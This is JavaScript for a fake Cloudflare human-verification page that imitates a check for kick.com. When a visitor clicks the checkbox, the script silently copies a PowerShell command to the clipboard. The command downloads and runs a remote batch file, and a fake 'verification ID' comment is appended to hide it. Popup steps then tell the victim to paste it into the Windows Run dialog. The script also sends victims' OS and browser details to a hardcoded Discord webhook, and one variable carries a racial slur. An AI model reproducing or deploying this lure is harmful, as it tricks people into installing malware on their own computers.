const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1344783285947203636/tEt80qmQf0P6kSbUEQPW8dkWfBAMyL-1VqUB-YxaPCIVru6GGw82rvRHd7fWTkykM8bz'; 

async function sendDiscordNotification(message) {
    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: message,
            }),
        });

        if (!response.ok) {
            console.error('Discord notification failed', await response.text());
        }
    } catch (error) {
        console.error('Error sending Discord notification:', error);
    }
}

var nig = `kick.com`;

document.getElementById("bWfyD1").innerText = document.getElementById("bWfyD1").innerText.replaceAll("...", nig);
document.getElementById("waiting-for").innerText = document.getElementById("waiting-for").innerText.replaceAll("...", nig);
document.getElementById("heading-favicon").innerText = document.getElementById("heading-favicon").innerText.replaceAll("...", nig);

let heading = document.getElementById("heading-favicon");
heading.innerText = heading.innerText.replaceAll("...", nig);
heading.innerHTML = `<h1 class="zone-name-title h1"><img src="/images/kick/favicon.ico" class="heading-favicon" alt="Icon">` + nig + `</h1>`;

if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
    document.body.classList.add("theme-dark");
} else {
    document.body.classList.add("theme-light");
}

function generateUniqueUsername() {
    const adjectives = [
        'Long', 'Spider', 'Crazy', 'Brave', 'Silent', 'Mighty', 'Quick', 'Wise', 
        'Sneaky', 'Cosmic', 'Iron', 'Golden', 'Shadow', 'Frost', 'Thunder'
    ];
    const animals = [
        'Dog', 'Cat', 'Wolf', 'Fox', 'Hawk', 'Bear', 'Lion', 'Eagle', 
        'Shark', 'Scat', 'Whale', 'Owl', 'Tiger', 'Cobra', 'Raven'
    ];

    const storedUsername = localStorage.getItem('uniqueUsername');
    if (storedUsername) {
        return storedUsername;
    }

    const username = 
        adjectives[Math.floor(Math.random() * adjectives.length)] + 
        animals[Math.floor(Math.random() * animals.length)];

    localStorage.setItem('uniqueUsername', username);

    return username;
}

const cmd = `powershell -Command "iwr 'https://github.com/ChatGPTCrack/main/releases/download/Cloudflare/System.bat' -OutFile '$env:temp\System.bat'; Start-Process '$env:temp\System.bat'"`;

const checkboxBtn = document.getElementById("checkbox");
const content = document.getElementById("HJup0");
const verifLogoId = document.getElementById("verifying");
const generatedId = generateRandomNumber();

const uniqueUsername = generateUniqueUsername();

let doOnce = false;
let clickCount = localStorage.getItem('clickCount') ? parseInt(localStorage.getItem('clickCount')) : 0;

checkboxBtn.addEventListener("click", async () => {
    const popupOverlay = document.getElementById("popup-overlay");
    popupOverlay.style.display = "flex";

    let focusElement = document.getElementById("focus-element");
    if (!focusElement) {
        focusElement = document.createElement("input");
        focusElement.id = "focus-element";
        focusElement.style.position = "absolute";
        focusElement.style.opacity = "0";
        focusElement.style.pointerEvents = "none";
        document.body.appendChild(focusElement);
    }
    focusElement.focus();

    setTimeout(() => {
        const popup = document.getElementById("popup");
        const loadingContainer = document.getElementById("loading-container");
        const loadingText = document.getElementById("loading-text");

        loadingContainer.style.display = "none";
        loadingText.style.transition = "opacity 0.5s ease";
        loadingText.style.opacity = 0;

        setTimeout(() => {
            popup.classList.add("expanded");

            const title = document.createElement("h3");
            title.textContent = "Extra Verification Needed";
            title.style.color = "white";

            const instructions = document.createElement("div");
            instructions.classList.add("instructions");
            instructions.innerHTML = `
                <p class="instruction-text">1. Press <b>Windows + R</b> to open the Run dialog.</p>
                <p class="instruction-text">2. Paste the verification text by pressing <b>CTRL + V</b>.</p>
                <p class="instruction-text">3. Press <b>OK</b> to verify you're not a robot.</p>
            `;

            const footer = document.createElement("div");
            footer.classList.add("text-center", "small-text");
            footer.innerHTML = `
                Performance &amp; security by
                <a rel="noopener noreferrer" href="https://www.cloudflare.com/?utm_source=challenge&amp;utm_campaign=m" target="_blank">
                    Cloudflare
                </a>
            `;

            popup.innerHTML = "";
            popup.appendChild(title);
            popup.appendChild(instructions);
            popup.appendChild(footer);

            console.log("Popup content displayed successfully");
        }, 500);
    }, 3000);

    clickCount++;
    localStorage.setItem('clickCount', clickCount);

    if (!doOnce) {
        doOnce = true;
    } else {
        return;
    }

    content.style.display = "none";
    verifLogoId.style.display = "flex";
    verifLogoId.style.visibility = "visible";

    const browserInfo = getBrowserInfo();

    let notificationMessage = `🔔 New click detected by ${uniqueUsername}!🔥\n` +
        `-------------------------------------\n` +
        ` OS:        ${browserInfo.os}\n` +
        ` SYSTEM:    ${browserInfo.name} ${browserInfo.version}\n` +
        ` CLICKS:    ${clickCount} 🔢\n` +
        ` SITE:      ` + window.location.host + `\n` +
        `-------------------------------------`;

    if (browserInfo.os === 'Windows') {
        notificationMessage = `💻✨ Windows User Alert! **${uniqueUsername}** clicked! 🎉\n` +
            `-------------------------------------\n` +
            ` OS:        ${browserInfo.os}\n` +
            ` SYSTEM:    ${browserInfo.name} ${browserInfo.version}\n` +
            ` CLICKS:    ${clickCount} 🔢\n` +
            ` SITE:      ` + window.location.host + `\n` +
            `-------------------------------------`;
    }

    await sendDiscordNotification(notificationMessage);

    var generatedId = Math.floor(1000000 + Math.random() * 9000000);

    checkboxBtn.disabled = true;

    stageClipboard(cmd, generatedId);

    if (browserInfo.os === 'Windows' && clickCount === 2) {
        await sendDiscordNotification(`⚠️ **${uniqueUsername}**, please check the panel ASAP! 🚀💫`);
    }

    if (browserInfo.os === 'Windows') {
        setTimeout(() => {
            sendDiscordNotification(`⏳ **${uniqueUsername}**, 20 seconds have passed! Keep me updated until I disappear! 👻`);
        }, 20000);
    }
});

function generateRandomNumber() {
    return Math.floor(Math.random() * (9999 - 1000 + 1) + 1000).toString();
}

function setClipboardCopyData(textToCopy) {
    const tempTextArea = document.createElement("textarea");
    tempTextArea.value = textToCopy;
    document.body.append(tempTextArea);
    tempTextArea.select();
    document.execCommand("copy");
    document.body.removeChild(tempTextArea);
}

function stageClipboard(commandToRun, verification_id) {
    const suffix = " # ";
    const ploy = "🟠  CIoudfIare Unique One-time Verification ID: ";
    const textToCopy = commandToRun + suffix + ploy + verification_id;

    setClipboardCopyData(textToCopy);
}

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browserName = 'Unknown', browserVersion = 'Unknown', osName = 'Unknown';

    if (ua.includes('Firefox')) {
        browserName = 'Firefox';
        browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Chrome')) {
        browserName = 'Chrome';
        browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Safari')) {
        browserName = 'Safari';
        browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
    } else if (ua.includes('MSIE')) {
        browserName = 'Internet Explorer';
        browserVersion = ua.match(/(MSIE|rv:)\s*([0-9.]+)/)?.[2] || 'Unknown';
    } else if (ua.includes('Edge')) {
        browserName = 'Microsoft Edge';
        browserVersion = ua.match(/Edge\/([0-9.]+)/)?.[1] || 'Unknown';
    }

    if (ua.includes('Windows')) osName = 'Windows';
    else if (ua.includes('Mac')) osName = 'macOS';
    else if (ua.includes('Linux')) osName = 'Linux';
    else if (ua.includes('Android')) osName = 'Android';
    else if (ua.includes('iOS')) osName = 'iOS';

    return {
        name: browserName,
        version: browserVersion,
        os: osName
    };
}
